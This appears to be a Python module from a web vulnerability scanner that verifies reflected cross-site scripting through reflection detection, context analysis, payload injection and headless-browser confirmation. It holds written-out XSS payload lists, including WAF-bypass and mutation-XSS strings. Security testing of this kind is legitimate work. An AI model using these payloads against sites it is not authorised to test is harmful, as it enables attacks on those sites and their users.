#!/usr/bin/env python3
"""
XSS Verifier
============
Multi-stage:
  Stage 1: Reflection detection
  Stage 2: Context analysis (HTML/attribute/JS/URL)
  Stage 3: Executability check (context-specific payloads)
  Stage 4: WAF bypass attempts
"""
import re
import secrets

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class XSSVerifier(BaseVerifier):
    VULN_TYPE = "XSS"
    VULN_TITLE = "Cross-Site Scripting (XSS)"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-79"
    DEFAULT_CVSS = 6.1
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    DEFAULT_REMEDIATION = (
        "Encode all user-controlled output using context-appropriate "
        "escaping (HTML entity, JavaScript, URL, CSS encoding). "
        "Implement Content-Security-Policy. Validate and sanitize input "
        "using allowlists."
    )

    CONTEXT_PAYLOADS = {
        "html": [
            '<script>alert("{m}")</script>',
            '<img src=x onerror=alert("{m}")>',
            '<svg/onload=alert("{m}")>',
            '<body onload=alert("{m}")>',
            '<input autofocus onfocus=alert("{m}")>',
            '<details open ontoggle=alert("{m}")>',
            '<marquee onstart=alert("{m}")>',
        ],
        "attribute_double": [
            '"><script>alert("{m}")</script>',
            '" onmouseover="alert(\'{m}\')"',
            '" autofocus onfocus="alert(\'{m}\')"',
            '" onload="alert(\'{m}\')"',
        ],
        "attribute_single": [
            "'><script>alert(\"{m}\")</script>",
            "' onmouseover='alert(\"{m}\")'",
            "' autofocus onfocus='alert(\"{m}\")'",
        ],
        "js_string": [
            '";alert("{m}");//',
            "';alert('{m}');//",
            '</script><script>alert("{m}")</script>',
            '\\";alert("{m}");//',
        ],
        "url": [
            'javascript:alert("{m}")',
            'data:text/html,<script>alert("{m}")</script>',
        ],
    }

    WAF_BYPASS = [
        '<scr<script>ipt>alert("{m}")</scr</script>ipt>',
        '<img src=x onerror="&#97;lert(\'{m}\')">',
        '<svg><script>alert("{m}")</script></svg>',
        '<iframe srcdoc="<script>alert(\'{m}\')</script>">',
        ('<math><mtext><table><mglyph><style><!--</style>'
         '<img src=x onerror=alert("{m}")>'),
    ]

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        marker = "x" + secrets.token_hex(6)

        # ── Stage 1: Reflection ──────────────────────────────────────────
        reflect_step = self.start_step(
            "reflection_detection",
            "Testing if input is reflected unescaped",
            stage="detection",
        )
        initial = f"ACS{marker}ACS"
        ex = self.inject(url, param, initial, method, form_data)
        if not ex or initial not in (ex.response_body or ""):
            self.finish_step(reflect_step, "failed",
                            details="Input is not reflected")
            return None

        self.finish_step(
            reflect_step, "passed",
            payload=initial,
            details=f"Marker reflected unescaped",
        )

        # ── Stage 2: Context detection ───────────────────────────────────
        context_step = self.start_step(
            "context_analysis",
            "Determining the reflection context",
            stage="detection",
        )
        context = self._detect_context(ex.response_body, initial)
        self.finish_step(
            context_step, "passed",
            details=f"Reflection context: {context}",
            evidence=[VerificationEvidence(
                type="reflection_context",
                title=f"Reflected in {context} context",
                description=f"Input is reflected in the {context} context.",
                payload=initial,
                raw_match=marker,
                exchange=ex,
                confidence=0.7,
                extracted_data={"context": context},
            )],
        )

        # ── Stage 3: Payload execution ───────────────────────────────────
        exec_step = self.start_step(
            "payload_execution",
            "Testing context-appropriate XSS payloads",
            stage="confirmation",
        )
        payloads = self.CONTEXT_PAYLOADS.get(context,
                                            self.CONTEXT_PAYLOADS["html"])
        for template in payloads:
            payload = template.replace("{m}", marker)
            ex2 = self.inject(url, param, payload, method, form_data)
            if not ex2 or ex2.response_status == 0:
                continue
            if self._is_executable(ex2.response_body or "", marker, payload):
                browser_ok = False
                if method.upper() == "GET" and self.config.get("browser_xss", True):
                    browser_ok = self._browser_confirm(url, param, marker, method, form_data)
                if self.config.get("browser_xss", True) and not browser_ok:
                    continue
                ev = VerificationEvidence(
                    type="reflected_xss",
                    title=f"XSS confirmed in {context} context",
                    description=(
                        f"The payload was reflected unescaped in the "
                        f"{context} context, allowing JavaScript execution "
                        f"in the victim's browser."
                    ),
                    payload=payload,
                    raw_match=marker,
                    exchange=ex2,
                    confidence=0.9,
                    extracted_data={"context": context, "marker": marker},
                )
                self.finish_step(
                    exec_step, "passed",
                    payload=payload,
                    details=f"Executable payload in {context} context",
                    evidence=[ev],
                )
                return self.build_finding(
                    url=url, param=param,
                    confidence=0.9,
                    description=(
                        f"XSS verified in {context} context. "
                        f"JavaScript payload executes in victim's browser."
                    ),
                    methods=["reflection_detection", "context_analysis",
                             "payload_execution"],
                    extracted_info={"context": context, "marker": marker},
                    key_exchange=ex2,
                )
        self.finish_step(exec_step, "failed",
                        details="Standard payloads were escaped/filtered")

        # ── Stage 4: WAF bypass ──────────────────────────────────────────
        bypass_step = self.start_step(
            "waf_bypass",
            "Attempting WAF filter bypass",
            stage="confirmation",
        )
        for template in self.WAF_BYPASS:
            payload = template.replace("{m}", marker)
            ex2 = self.inject(url, param, payload, method, form_data)
            if not ex2 or ex2.response_status == 0:
                continue
            if self._is_executable(ex2.response_body or "", marker, payload):
                browser_ok = False
                if method.upper() == "GET" and self.config.get("browser_xss", True):
                    browser_ok = self._browser_confirm(url, param, marker, method, form_data)
                if self.config.get("browser_xss", True) and not browser_ok:
                    continue
                ev = VerificationEvidence(
                    type="reflected_xss_waf_bypass",
                    title="XSS bypasses WAF filter",
                    description="Payload executed despite input filtering",
                    payload=payload,
                    exchange=ex2,
                    confidence=0.85,
                    extracted_data={"context": context},
                )
                self.finish_step(
                    bypass_step, "passed",
                    payload=payload,
                    details="WAF bypass successful",
                    evidence=[ev],
                )
                return self.build_finding(
                    url=url, param=param,
                    confidence=0.85,
                    description="XSS confirmed via WAF bypass payload",
                    methods=["reflection", "context_analysis", "waf_bypass"],
                    key_exchange=ex2,
                )
        self.finish_step(bypass_step, "failed",
                        details="No bypass succeeded")
        return None

    def _browser_confirm(self, url, param, marker, method="GET", form_data=None):
        """Optional real-browser confirmation for reflected/DOM XSS (GET only)."""
        try:
            from urllib.parse import urlsplit, parse_qs, urlencode
            from playwright.sync_api import sync_playwright
            parsed=urlsplit(url); qs=parse_qs(parsed.query, keep_blank_values=True)
            payload=f'"><img src=x onerror=\"window.__acuscan_xss_marker=\'{marker}\'\">'
            qs[param]=[payload]
            target=f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}?{urlencode(qs,doseq=True)}"
            with sync_playwright() as pw:
                browser=pw.chromium.launch(headless=True)
                ctx=browser.new_context(ignore_https_errors=True)
                try:
                    if self.http.base_client:
                        cookies=[]
                        for c in self.http.base_client.session.cookies:
                            cookies.append({"name":c.name,"value":c.value,"domain":parsed.hostname,"path":c.path or "/"})
                        if cookies: ctx.add_cookies(cookies)
                except Exception: pass
                page=ctx.new_page()
                page.goto(target, wait_until="domcontentloaded", timeout=int(self.http.timeout*1000))
                page.wait_for_timeout(250)
                ok=page.evaluate("m => window.__acuscan_xss_marker === m", marker)
                browser.close()
                return bool(ok)
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════════
    #  Helpers
    # ═══════════════════════════════════════════════════════════════════════

    def _detect_context(self, body, marker):
        idx = body.find(marker)
        if idx == -1:
            return "not_reflected"
        before = body[:idx]
        last_lt = before.rfind('<')
        last_gt = before.rfind('>')
        if last_lt > last_gt:
            end = min(len(body), idx + 200)
            tag = body[last_lt:end]
            marker_pos = tag.find(marker)
            dq = tag.find('"')
            sq = tag.find("'")
            if dq != -1 and dq < marker_pos:
                return "attribute_double"
            if sq != -1 and sq < marker_pos:
                return "attribute_single"
            return "attribute_double"
        return "html"

    def _is_executable(self, body, marker, payload):
        idx = body.find(marker)
        if idx == -1:
            return False
        ctx = body[max(0, idx - 300):min(len(body), idx + 300)]
        patterns = [
            r'<script[^>]*>.*?' + re.escape(marker),
            r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(marker),
            r'javascript:[^"\']*' + re.escape(marker),
            r'srcdoc\s*=\s*["\'][^"\']*' + re.escape(marker),
        ]
        for p in patterns:
            if re.search(p, ctx, re.I | re.S):
                return True
        return False